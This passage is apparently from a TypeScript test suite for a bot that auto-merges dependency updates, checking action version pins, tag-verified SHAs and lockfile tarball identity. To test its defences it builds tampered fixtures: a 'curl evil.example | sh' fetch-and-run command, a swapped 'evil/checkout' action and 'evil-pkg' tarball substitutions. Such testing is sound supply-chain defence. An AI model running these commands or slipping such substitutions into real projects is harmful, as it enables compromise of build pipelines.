  it("reads the version from a tag or from the comment on a SHA pin", () => {
    expect(actionVersion({ ref: "v5.0.1", comment: "" })).toBe("5.0.1");
    expect(actionVersion({ ref: "v5", comment: "" })).toBe("5.0.0");
    expect(
      actionVersion({ ref: SHA_V5_0_1, comment: " # v5.0.1 (tag v5)" }),
    ).toBe("5.0.1");
    expect(actionVersion({ ref: SHA_V5_0_1, comment: "" })).toBeNull();

    // The executable reference wins: a comment cannot describe v6 as a patch.
    expect(actionVersion({ ref: "v6", comment: " # v5.0.2 (tag v5)" })).toBe(
      "6.0.0",
    );
  });

  it("accepts a reference bump", () => {
    expect(
      deriveWorkflowUpdates(WORKFLOW, bumpCheckout(WORKFLOW, "5.0.2")),
    ).toEqual({
      updates: [
        {
          name: "actions/checkout",
          fromVersion: "5.0.1",
          toVersion: "5.0.2",
          toRef: SHA_V5_0_2,
          toRefKind: "sha",
          dependencyType: "github-action",
          removed: false,
        },
      ],
    });
  });

  it("refuses an edit to anything that is not an action reference", () => {
    const tampered = WORKFLOW.replace(
      "npm run test:unit:run",
      "curl evil.example | sh",
    );
    expect(deriveWorkflowUpdates(WORKFLOW, tampered).problem).toContain(
      "not an action reference",
    );
  });

  it("refuses a swapped action, added lines and an unreadable side", () => {
    expect(
      deriveWorkflowUpdates(
        WORKFLOW,
        WORKFLOW.replace("actions/checkout", "evil/checkout"),
      ).problem,
    ).toContain("swaps the action");
    expect(
      deriveWorkflowUpdates(WORKFLOW, WORKFLOW + "      - run: whoami\n")
        .problem,
    ).toContain("adds or removes lines");
    expect(deriveWorkflowUpdates(null, WORKFLOW).problem).toContain(
      "could not be read",
    );
  });

  it("applies the action policy to the reference that actually moved", () => {
    const changes = (version: string) => [
      {
        path: ".github/workflows/tests.yml",
        baseText: WORKFLOW,
        headText: bumpCheckout(WORKFLOW, version),
      },
    ];
    const declared = ["actions/checkout"];

    expect(evaluateWorkflowChanges(changes("5.0.2"), declared).safe).toBe(true);
    expect(evaluateWorkflowChanges(changes("5.1.0"), declared).safe).toBe(true);

    const major = evaluateWorkflowChanges(changes("6.0.0"), declared);
    expect(major.safe).toBe(false);
    expect(major.reason).toContain("major");
  });

  it("refuses an action the pull request never declared", () => {
    const changes = [
      {
        path: ".github/workflows/tests.yml",
        baseText: WORKFLOW,
        headText: WORKFLOW.replace("# v4.1.0 (tag v4)", "# v4.2.0 (tag v4)"),
      },
    ];
    const result = evaluateWorkflowChanges(changes, ["actions/checkout"]);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("actions/setup-node");
  });

  it("merges an action bump but not a workflow edit riding on the same trailer", async () => {
    const state = (headText: string) => ({
      pull: actionsPull(),
      files: [".github/workflows/tests.yml"],
      commits: [ACTION_BUMP_COMMIT],
      contents: {
        "basesha1:.github/workflows/tests.yml": WORKFLOW,
        "headsha1:.github/workflows/tests.yml": headText,
      },
    });

    const clean = fakeGithub({
      ...state(bumpCheckout(WORKFLOW, "5.0.2")),
      tags: { "actions/checkout@v5.0.2": SHA_V5_0_2 },
    });
    await run({ github: clean.github, context: CONTEXT, core: CORE });
    expect(clean.calls.merges).toHaveLength(1);

    // Same patch-sized trailer, but a command has been swapped underneath it.
    const tampered = fakeGithub({
      ...state(
        bumpCheckout(WORKFLOW, "5.0.2").replace(
          "npm run test:unit:run",
          "curl evil.example | sh",
        ),
      ),
      tags: { "actions/checkout@v5.0.2": SHA_V5_0_2 },
    });
    await run({ github: tampered.github, context: CONTEXT, core: CORE });
    expect(tampered.calls.merges).toHaveLength(0);
  });
});

describe("registry tarball identity", () => {
  const entry = (overrides: any = {}) => ({
    version: "1.8.3",
    resolved: "https://registry.npmjs.org/axios/-/axios-1.8.3.tgz",
    integrity: "sha512-new",
    ...overrides,
  });

  it("accepts a tarball that matches the package and version", () => {
    expect(resolvedUrlMatchesPackage("node_modules/axios", entry())).toBe(true);
  });

  it("accepts a scoped package and an aliased entry", () => {
    expect(
      resolvedUrlMatchesPackage("node_modules/@vitest/spy", {
        version: "4.1.11",
        resolved: "https://registry.npmjs.org/@vitest/spy/-/spy-4.1.11.tgz",
      }),
    ).toBe(true);
    expect(
      resolvedUrlMatchesPackage("node_modules/my-alias", {
        name: "axios",
        version: "1.8.3",
        resolved: "https://registry.npmjs.org/axios/-/axios-1.8.3.tgz",
      }),
    ).toBe(true);
  });

  it("rejects another package's tarball and a mismatched version", () => {
    expect(
      resolvedUrlMatchesPackage(
        "node_modules/axios",
        entry({
          resolved: "https://registry.npmjs.org/evil-pkg/-/evil-pkg-1.0.0.tgz",
        }),
      ),
    ).toBe(false);
    expect(
      resolvedUrlMatchesPackage(
        "node_modules/axios",
        entry({
          resolved: "https://registry.npmjs.org/axios/-/axios-0.27.2.tgz",
        }),
      ),
    ).toBe(false);
  });

  it("rejects substituting a tarball while keeping the version", () => {
    const head = lockfile({
      "node_modules/axios": {
        version: "1.8.2",
        resolved: "https://registry.npmjs.org/evil-pkg/-/evil-pkg-1.0.0.tgz",
        integrity: "sha512-substituted",
      },
    });
    const result = evaluateLockfileChanges(BASE_LOCK, head, BASE_MANIFEST);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("without changing its version");
  });

  it("rejects a new entry pointing at a different package's tarball", () => {
    const head = lockfile({
      ...BASE_LOCK.packages,
      "node_modules/left-pad": {
        version: "1.3.0",
        resolved: "https://registry.npmjs.org/evil-pkg/-/evil-pkg-1.0.0.tgz",
        integrity: "sha512-x",
      },
    });
    const result = evaluateLockfileChanges(BASE_LOCK, head, BASE_MANIFEST);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("not that package at 1.3.0");
  });

  it("still accepts an ordinary upgrade", () => {
    const head = lockfile({
      "node_modules/axios": {
        version: "1.8.3",
        resolved: "https://registry.npmjs.org/axios/-/axios-1.8.3.tgz",
        integrity: "sha512-new",
      },
    });
    expect(evaluateLockfileChanges(BASE_LOCK, head, BASE_MANIFEST).safe).toBe(
      true,
    );
  });
});

describe("a version comment is a claim, not proof", () => {
  it("classifies what the reference actually is", () => {
    expect(classifyActionRef("v5.0.1")).toEqual({
      kind: "tag",
      version: "5.0.1",
    });
    expect(classifyActionRef("v5")).toEqual({ kind: "tag", version: "5.0.0" });
    expect(classifyActionRef(SHA_V5_0_1)).toEqual({ kind: "sha" });
    expect(classifyActionRef("main")).toEqual({ kind: "unknown" });
  });

  it("rejects a major tag wearing a patch comment", () => {
    // @v6 executes v6 whatever "# v5.0.2" says next to it.
    const changes = [
      {
        path: ".github/workflows/tests.yml",
        baseText: WORKFLOW,
        headText: WORKFLOW.replace(
          `${SHA_V5_0_1} # v5.0.1 (tag v5)`,
          "v6 # v5.0.2 (tag v5)",
        ),
      },
    ];
    const result = evaluateWorkflowChanges(changes, ["actions/checkout"]);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("major");
  });

  it("verifies a SHA pin against the action's real tags", async () => {
    const github = {
      rest: {
        git: {
          getRef: async ({ ref }: any) => {
            if (ref !== "tags/v5.0.2") throw new Error("Not Found");
            return { data: { object: { type: "commit", sha: SHA_V5_0_2 } } };
          },
          getTag: async () => {
            throw new Error("Not Found");
          },
        },
      },
    };
    const update = (toRef: string, toVersion: string | null) => [
      { name: "actions/checkout", toRef, toRefKind: "sha", toVersion },
    ];

    expect(
      (await verifyActionReferences(github, update(SHA_V5_0_2, "5.0.2"))).safe,
    ).toBe(true);

    // An arbitrary SHA claiming to be that release.
    const forged = await verifyActionReferences(
      github,
      update("f".repeat(40), "5.0.2"),
    );
    expect(forged.safe).toBe(false);
    expect(forged.reason).toContain("is not the commit tagged 5.0.2");

    // A real release SHA relabelled as a different version.
    expect(
      (await verifyActionReferences(github, update(SHA_V5_0_2, "5.0.3"))).safe,
    ).toBe(false);

    // A SHA pin with no version at all.
    expect(
      (await verifyActionReferences(github, update(SHA_V5_0_2, null))).safe,
    ).toBe(false);
  });

  it("follows an annotated tag to its commit", async () => {
    const github = {
      rest: {
        git: {
          getRef: async () => ({
            data: { object: { type: "tag", sha: "tagobject" } },
          }),
          getTag: async ({ tag_sha }: any) => ({
            data: {
              object: { sha: tag_sha === "tagobject" ? SHA_V5_0_2 : "x" },
            },
          }),
        },
      },
    };
    expect(
      (
        await verifyActionReferences(github, [
          {
            name: "actions/checkout",
            toRef: SHA_V5_0_2,
            toRefKind: "sha",
            toVersion: "5.0.2",
          },
        ])
      ).safe,
    ).toBe(true);
  });

  it("needs no tag lookup for a reference that carries its own version", async () => {
    const github = {
      rest: {
        git: {
          getRef: async () => {
            throw new Error("should not be called");
          },
          getTag: async () => {
            throw new Error("should not be called");
          },
        },
      },
    };
    expect(
      (
        await verifyActionReferences(github, [
          {
            name: "actions/checkout",
            toRef: "v5.0.2",
            toRefKind: "tag",
            toVersion: "5.0.2",
          },
        ])
      ).safe,
    ).toBe(true);
  });

  it("merges nothing when a pull request pins a SHA no release points at", async () => {
    const { github, calls } = fakeGithub({
      pull: actionsPull(),
      files: [".github/workflows/tests.yml"],
      commits: [ACTION_BUMP_COMMIT],
      contents: {
        "basesha1:.github/workflows/tests.yml": WORKFLOW,
        "headsha1:.github/workflows/tests.yml": bumpCheckout(
          WORKFLOW,
          "5.0.2",
          "a".repeat(40),
        ),
      },
      tags: { "actions/checkout@v5.0.2": SHA_V5_0_2 },
    });

    await run({ github, context: CONTEXT, core: CORE });

    expect(calls.merges).toHaveLength(0);
  });
});

describe("the dev tree is read from the merge target, not from the pull request", () => {
  const entry = (version: string, dev: boolean) => ({
    "node_modules/deep": {
      version,
      resolved: `https://registry.npmjs.org/deep/-/deep-${version}.tgz`,
      integrity: `sha512-${version}`,
      ...(dev ? { dev: true } : {}),
    },
  });

  it("types an entry from the base lockfile and the base manifest", () => {
    expect(
      lockEntryDependencyType("node_modules/deep", { dev: true }, {}),
    ).toBe("direct:development");
    expect(lockEntryDependencyType("node_modules/deep", {}, {})).toBe(
      "indirect",
    );
    expect(
      lockEntryDependencyType(
        "node_modules/axios",
        { dev: true },
        BASE_MANIFEST,
      ),
    ).toBe("direct:production");
  });

  it("rejects a production package reclassified as dev in the same diff", () => {
    const result = evaluateLockfileChanges(
      lockfile(entry("1.0.0", false)),
      lockfile(entry("1.1.0", true)),
      {},
    );
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("into the dev tree");
  });

  it("rejects the reverse reclassification too", () => {
    const result = evaluateLockfileChanges(
      lockfile(entry("1.0.0", true)),
      lockfile(entry("1.0.1", false)),
      {},
    );
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("out of the dev tree");
  });

  it("still allows an honest dev-tree minor and still blocks a production one", () => {
    expect(
      evaluateLockfileChanges(
        lockfile(entry("1.0.0", true)),
        lockfile(entry("1.1.0", true)),
        {},
      ).safe,
    ).toBe(true);
    expect(
      evaluateLockfileChanges(
        lockfile(entry("1.0.0", false)),
        lockfile(entry("1.1.0", false)),
        {},
      ).safe,
    ).toBe(false);
  });

  it("merges nothing when a patch pull request reclassifies a package to widen the policy", async () => {
    const base = lockfile({
      ...BASE_LOCK.packages,
      ...entry("1.0.0", false),
    });
    const head = lockfile({
      ...BASE_LOCK.packages,
      ...entry("1.1.0", true),
    });

    const { github, calls } = fakeGithub({
      pull: pull(),
      files: ["package-lock.json"],
      commits: [PATCH_COMMIT],
      contents: {
        "basesha1:package.json": BASE_MANIFEST,
        "headsha1:package.json": BASE_MANIFEST,
        "basesha1:package-lock.json": base,
        "headsha1:package-lock.json": head,
      },
    });

    await run({ github, context: CONTEXT, core: CORE });

    expect(calls.merges).toHaveLength(0);
  });
});
